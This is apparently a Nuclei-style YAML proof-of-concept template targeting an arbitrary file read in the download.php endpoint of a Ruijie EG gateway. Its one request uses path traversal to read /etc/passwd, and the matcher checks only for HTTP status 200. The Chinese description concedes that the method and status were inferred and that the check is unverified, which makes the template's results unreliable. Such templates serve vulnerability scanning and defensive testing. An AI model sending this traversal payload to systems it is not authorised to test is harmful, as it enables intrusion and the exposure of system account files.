id: poc-78f6f6a5da0e58039aa3
info:
  name: 锐捷EG易网关download.php后台任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: lfi,2025
http:
- raw:
  - 'GET /download.php?a=read_txt&file=../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
